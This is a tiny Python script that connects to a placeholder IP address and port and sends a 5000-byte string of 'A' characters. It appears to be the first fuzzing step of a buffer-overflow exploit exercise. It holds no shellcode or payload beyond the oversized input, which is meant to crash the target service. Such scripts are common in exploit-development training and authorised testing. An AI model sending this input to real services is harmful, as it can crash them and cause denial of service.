#!/usr/bin/python
import socket

buffer =  'A' * 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("IP", PORT))

s.send(buffer)
s.close()
